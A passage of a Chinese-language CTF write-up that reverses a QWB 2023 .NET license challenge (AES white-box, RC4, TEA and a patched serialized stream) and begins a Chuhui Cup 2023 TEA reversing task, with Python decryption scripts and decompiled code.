class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        array[i] = v16[array2[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    array.CopyTo(v16, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序逻辑，获取输入，然后进入<code>AAA</code>加密比对，然后将<code>License.dat</code>数据进行<code>EEE</code>解密，进行反序列化。</p>
<p>先看<code>AAA</code>的加密：</p>
<p>网上WP说这是AES白盒，真看不出来。</p>
<p>本来想写个<code>z3</code>看看能不能解的，结果才知道<code>z3</code>的变量类型不能当数组的<code>index</code>。</p>
<p>直接给闵神爆破出来了✪ ω ✪：<code>WelcomeToQWB2023</code></p>
<p>然后进入<code>EEE：RC4</code>，密钥是<code>WelcomeToQWB2023</code></p>
<p><code>Cyberchef</code>解得：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231222150308017.png"></p>
<p>这里其他的看不懂，但有个<code>FFF</code>，应该是反序列化会执行到这个函数。</p>
<p><code>FFF</code>是个TEA加密，密文、密钥都有，解得：<code>dotN3t_Is_1nt3r3sting   </code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tea_dec</span>(<span class="params">cipher, key</span>):</span><br><span class="line">    num = (<span class="number">3735928559</span> * <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        cipher[<span class="number">1</span>] -= ((num + cipher[<span class="number">0</span>]) ^ ((cipher[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) + key[<span class="number">2</span>])</span><br><span class="line">                      ^ ((cipher[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        cipher[<span class="number">1</span>] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">        cipher[<span class="number">0</span>] -= ((num + cipher[<span class="number">1</span>]) ^ ((cipher[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + key[<span class="number">0</span>])</span><br><span class="line">                      ^ ((cipher[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        cipher[<span class="number">0</span>] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">        num = (num - <span class="number">3735928559</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea</span>():</span><br><span class="line">    result = [</span><br><span class="line">        <span class="number">69</span>, <span class="number">182</span>, <span class="number">171</span>, <span class="number">33</span>, <span class="number">121</span>, <span class="number">107</span>, <span class="number">254</span>, <span class="number">150</span>, <span class="number">92</span>, <span class="number">29</span>,</span><br><span class="line">        <span class="number">4</span>, <span class="number">178</span>, <span class="number">138</span>, <span class="number">166</span>, <span class="number">184</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">241</span>, <span class="number">42</span>, <span class="number">191</span>,</span><br><span class="line">        <span class="number">23</span>, <span class="number">211</span>, <span class="number">3</span>, <span class="number">107</span></span><br><span class="line">    ]</span><br><span class="line">    result = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;6I&#x27;</span>, <span class="built_in">bytes</span>(result)))</span><br><span class="line">    key = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;4I&#x27;</span>, <span class="string">b&quot;WelcomeToQWB2023&quot;</span>))</span><br><span class="line">    flag = []</span><br><span class="line">    content = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>):</span><br><span class="line">        content += tea_dec(result[i:i + <span class="number">2</span>], key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        flag += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, content[i])</span><br><span class="line">    <span class="comment"># print(bytes(flag))</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(flag)</span><br></pre></td></tr></table></figure>

<p><code>FFF</code>后面还有一段：<code>v7</code>是解密后的<code>Lisence.dat</code></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">byte</span>[] array3 = MD5.Create().ComputeHash(Program.v7);</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> m = <span class="number">0</span>; m &lt; Program.v10.Length; m++)</span><br><span class="line">&#123;</span><br><span class="line">    Program.v10[m] = (Program.v10[m] ^ array3[m % array3.Length]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但执行后，啥也不是。</p>
<p>题干提示了<code>fix the lisence</code>，且程序进行反序列化的时候报错，所以还需要修改<code>lisence</code></p>
<p>在报错的地方断住，即<code>switch</code>的<code>default</code>位置：</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">internal</span> <span class="keyword">void</span> <span class="title">Run</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">this</span>.ReadBegin();</span><br><span class="line">        <span class="keyword">this</span>.ReadSerializationHeaderRecord();</span><br><span class="line">        <span class="keyword">while</span> (flag)</span><br><span class="line">        &#123;</span><br><span class="line">            BinaryHeaderEnum binaryHeaderEnum = BinaryHeaderEnum.Object;</span><br><span class="line">            BinaryTypeEnum binaryTypeEnum = <span class="keyword">this</span>.expectedType;</span><br><span class="line">            <span class="keyword">if</span> (binaryTypeEnum != BinaryTypeEnum.Primitive)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (binaryTypeEnum - BinaryTypeEnum.String &gt; <span class="number">6</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> SerializationException(Environment.GetResourceString(<span class="string">&quot;Serialization_TypeExpected&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">byte</span> b = <span class="keyword">this</span>.dataReader.ReadByte();</span><br><span class="line">                binaryHeaderEnum = (BinaryHeaderEnum)b;</span><br><span class="line">                <span class="keyword">switch</span> (binaryHeaderEnum)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.Object:</span><br><span class="line">                        <span class="keyword">this</span>.ReadObject();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.ObjectWithMap:</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.ObjectWithMapAssemId:</span><br><span class="line">                        <span class="keyword">this</span>.ReadObjectWithMap(binaryHeaderEnum);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.ObjectWithMapTyped:</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.ObjectWithMapTypedAssemId:</span><br><span class="line">                        <span class="keyword">this</span>.ReadObjectWithMapTyped(binaryHeaderEnum);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.ObjectString:</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.CrossAppDomainString:</span><br><span class="line">                        <span class="keyword">this</span>.ReadObjectString(binaryHeaderEnum);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.Array:</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.ArraySinglePrimitive:</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.ArraySingleObject:</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.ArraySingleString:</span><br><span class="line">                        <span class="keyword">this</span>.ReadArray(binaryHeaderEnum);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.MemberPrimitiveTyped:</span><br><span class="line">                        <span class="keyword">this</span>.ReadMemberPrimitiveTyped();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.MemberReference:</span><br><span class="line">                        <span class="keyword">this</span>.ReadMemberReference();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.ObjectNull:</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.ObjectNullMultiple256:</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.ObjectNullMultiple:</span><br><span class="line">                        <span class="keyword">this</span>.ReadObjectNull(binaryHeaderEnum);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.MessageEnd:</span><br><span class="line">                        flag = <span class="literal">false</span>;</span><br><span class="line">                        <span class="keyword">this</span>.ReadMessageEnd();</span><br><span class="line">                        <span class="keyword">this</span>.ReadEnd();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.Assembly:</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.CrossAppDomainAssembly:</span><br><span class="line">                        <span class="keyword">this</span>.ReadAssembly(binaryHeaderEnum);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.CrossAppDomainMap:</span><br><span class="line">                        <span class="keyword">this</span>.ReadCrossAppDomainMap();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.MethodCall:</span><br><span class="line">                    <span class="keyword">case</span> BinaryHeaderEnum.MethodReturn:</span><br><span class="line">                        <span class="keyword">this</span>.ReadMethodObject(binaryHeaderEnum);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="literal">default</span>:</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> SerializationException(</span><br><span class="line">                            Environment.GetResourceString(</span><br><span class="line">                                <span class="string">&quot;Serialization_BinaryHeader&quot;</span>, </span><br><span class="line">                                <span class="keyword">new</span> <span class="built_in">object</span>[]&#123;b&#125;</span><br><span class="line">                            )</span><br><span class="line">                        );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>.ReadMemberPrimitiveUnTyped();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>报错的原因是因为<code>b</code>为<code>0x00</code>，而<code>b</code>的来源是读取文件的，位置在<code>0x294</code>：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231222172614087.png"></p>
<p>在<code>switch</code>断住，一个个看报错前的上一次<code>switch</code>是什么，发现是在<code>ObjectString</code></p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231222173028921.png"></p>
<p>里面有读字符串操作：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231222191212537.png"></p>
<p>先读了一个<code>Int32</code>为<code>0x6</code>：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231222185916846.png"></p>
<p>再读字符串：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231222190240404.png"></p>
<p>跟进<code>ReadString</code>：</p>
<ol>
<li><code>Read7BitEncodedInt</code>按解析1Byte的数据，这里获取的数据为0x0，因此返回<code>string.Empty</code></li>
<li>如果<code>Read7BitEncodedInt</code>获取的数据不为0x0，在后面有<code>this.m_stream.Read(this.m_charBytes, 0, count);</code>就是读取字符串的操作。因此，先读取1Byte的长度，再根据长度读取字符串。</li>
</ol>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">__DynamicallyInvokable</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="built_in">string</span> <span class="title">ReadString</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.m_stream == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        __Error.FileNotOpen();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> num2 = <span class="keyword">this</span>.Read7BitEncodedInt();</span><br><span class="line">    <span class="keyword">if</span> (num2 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(</span><br><span class="line">            Environment.GetResourceString(</span><br><span class="line">                <span class="string">&quot;IO.IO_InvalidStringLen_Len&quot;</span>, <span class="keyword">new</span> <span class="built_in">object</span>[&#123;num2&#125;</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (num2 == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">string</span>.Empty;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.m_charBytes == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.m_charBytes = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">128</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.m_charBuffer == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.m_charBuffer = <span class="keyword">new</span> <span class="built_in">char</span>[<span class="keyword">this</span>.m_maxCharsSize];</span><br><span class="line">    &#125;</span><br><span class="line">    StringBuilder stringBuilder = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">int</span> chars;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span> count = (num2 - num &gt; <span class="number">128</span>) ? <span class="number">128</span> : (num2 - num);</span><br><span class="line">        <span class="built_in">int</span> num3 = <span class="keyword">this</span>.m_stream.Read(<span class="keyword">this</span>.m_charBytes, <span class="number">0</span>, count);</span><br><span class="line">        <span class="keyword">if</span> (num3 == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            __Error.EndOfFile();</span><br><span class="line">        &#125;</span><br><span class="line">        chars = <span class="keyword">this</span>.m_decoder.GetChars(<span class="keyword">this</span>.m_charBytes, <span class="number">0</span>, num3, <span class="keyword">this</span>.m_charBuffer, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span> &amp;&amp; num3 == num2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stringBuilder == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            stringBuilder = StringBuilderCache.Acquire(Math.Min(num2, <span class="number">360</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        stringBuilder.Append(<span class="keyword">this</span>.m_charBuffer, <span class="number">0</span>, chars);</span><br><span class="line">        num += num3;</span><br><span class="line">        <span class="keyword">if</span> (num &gt;= num2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">goto</span> Block_11;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">string</span>(<span class="keyword">this</span>.m_charBuffer, <span class="number">0</span>, chars);</span><br><span class="line">    Block_11:</span><br><span class="line">    <span class="keyword">return</span> StringBuilderCache.GetStringAndRelease(stringBuilder);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上，得到：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231222194318837.png"></p>
<p>而下一步报错的原因就是，读取下一步操作的<code>opcode</code>为<code>0x0</code>，没有定义，就报错了。</p>
<p>因此，可能就是报错的时候读取的不是<code>opcode</code>，是字符串被<code>Patch</code>为00了</p>
<p>再根据被Patch的数据之后，再<code>0x2A8</code>的位置，也有个<code>06 07 00 00 00</code>，字符串估计就是从<code>0x293~0x2A7</code>，长度为21。</p>
<p>恰好<code>FFF</code>解密得到的字符串就为21长度，放进去。</p>
<p>对于后面的<code>06 07 00 00 00</code>也是对应一个字符串，长度为16，应该就是放<code>AAA</code>解密的字符串了。</p>
<p>再想想，有点难以理解，但是想到<code>FFF</code>的参数恰好就是上面的两个字符串，可能是这个反序列化过程，这两个字符串可以作为其<code>FFF</code>函数的参数了吧。</p>
<p>Patch之后：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231222195139928.png"></p>
<p>再继续<code>FFF</code>后面的过程就可以得到FLAG了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v10 = [</span><br><span class="line">    <span class="number">59</span>, <span class="number">65</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">223</span>, <span class="number">90</span>, <span class="number">245</span>, <span class="number">226</span>, <span class="number">6</span>, <span class="number">122</span>,</span><br><span class="line">    <span class="number">219</span>, <span class="number">170</span>, <span class="number">147</span>, <span class="number">176</span>, <span class="number">22</span>, <span class="number">190</span>, <span class="number">60</span>, <span class="number">24</span>, <span class="number">58</span>, <span class="number">86</span>,</span><br><span class="line">    <span class="number">150</span>, <span class="number">97</span>, <span class="number">188</span>, <span class="number">166</span>, <span class="number">113</span>, <span class="number">104</span>, <span class="number">232</span>, <span class="number">197</span>, <span class="number">234</span>, <span class="number">225</span>,</span><br><span class="line">    <span class="number">22</span>, <span class="number">183</span>, <span class="number">40</span>, <span class="number">78</span>, <span class="number">102</span>, <span class="number">116</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;array3&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">md5_hash = hashlib.md5(data).hexdigest()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v10)):</span><br><span class="line">    index =  (i * <span class="number">2</span>) % <span class="built_in">len</span>(md5_hash)</span><br><span class="line">    v10[i] ^= <span class="built_in">int</span>(md5_hash[index:index+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v10))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;d0tN3t_I5_Ea57_2_y09!G00d_Luck&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="楚慧杯2023"><a href="#楚慧杯2023" class="headerlink" title="楚慧杯2023"></a>楚慧杯2023</h1><h2 id="babyre-1"><a href="#babyre-1" class="headerlink" title="babyre"></a>babyre</h2><p>解混淆后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Plz input your flag:&quot;</span>);</span><br><span class="line">    v9[<span class="number">0</span>] = <span class="number">0x87654321DEADBEEF</span>LL;</span><br><span class="line">    v9[<span class="number">1</span>] = <span class="number">0xCAFEBABEFACEB00C</span>LL;</span><br><span class="line">    fgets(s, <span class="number">50</span>, MEMORY[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, &amp;unk_400E90, <span class="number">0x48</span>uLL);</span><br><span class="line">    v7 = (<span class="built_in">strlen</span>(s) + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">8LL</span> * v7);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">        LODWORD(v4) = *(_DWORD *)&amp;s[<span class="number">4</span> * i];</span><br><span class="line">        encode(<span class="number">32LL</span>, &amp;v4, v9);</span><br><span class="line">        *((_QWORD *)ptr + i) = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt;= <span class="number">2</span> * v7 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Congratulations\n&quot;</span>);</span><br><span class="line">            <span class="built_in">free</span>(ptr);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_DWORD *)ptr + i) != dest[i] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示了TEA，就直接脚本解了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line">result = [<span class="number">0x72</span>, <span class="number">0x86</span>, <span class="number">0x8F</span>, <span class="number">0x16</span>, <span class="number">0x24</span>, <span class="number">0xD8</span>, <span class="number">0xDB</span>, <span class="number">0x02</span>, <span class="number">0xCA</span>, <span class="number">0x7F</span>, <span class="number">0x64</span>, <span class="number">0xCF</span>, <span class="number">0xEF</span>, <span class="number">0xA7</span>, <span class="number">0xEF</span>, <span class="number">0xE6</span>, <span class="number">0xF0</span>, <span class="number">0x16</span>, <span class="number">0xE0</span>, <span class="number">0x4A</span>, <span class="number">0x1D</span>, <span class="number">0x2E</span>, <span class="number">0x83</span>, <span class="number">0xC5</span>, <span class="number">0x05</span>, <span class="number">0x0A</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, <span class="number">0x40</span>, <span class="number">0x81</span>, <span class="number">0xEB</span>, <span class="number">0xFF</span>, <span class="number">0xEF</span>, <span class="number">0x61</span>, <span class="number">0x95</span>, <span class="number">0xBE</span>, <span class="number">0x23</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0x7F</span>, <span class="number">0x69</span>, <span class="number">0x42</span>, <span class="number">0xC0</span>, <span class="number">0x3B</span>, <span class="number">0x5B</span>, <span class="number">0x82</span>, <span class="number">0x8B</span>, <span class="number">0xC6</span>, <span class="number">0xF0</span>, <span class="number">0xB1</span>, <span class="number">0xA5</span>, <span class="number">0xE6</span>, <span class="number">0xBD</span>, <span class="number">0xCB</span>, <span class="number">0x03</span>, <span class="number">0xBD</span>, <span class="number">0x0E</span>, <span class="number">0xCE</span>, <span class="number">0xB3</span>, <span class="number">0xA9</span>, <span class="number">0xE7</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x6C</span>, <span class="number">0xEF</span>, <span class="number">0x71</span>, <span class="number">0x5C</span>, <span class="number">0x9F</span>, <span class="number">0x57</span>, <span class="number">0xBD</span>, <span class="number">0xE4</span>, <span class="number">0x3B</span>]</span><br><span class="line">key = [<span class="number">0x87654321DEADBEEF</span>, <span 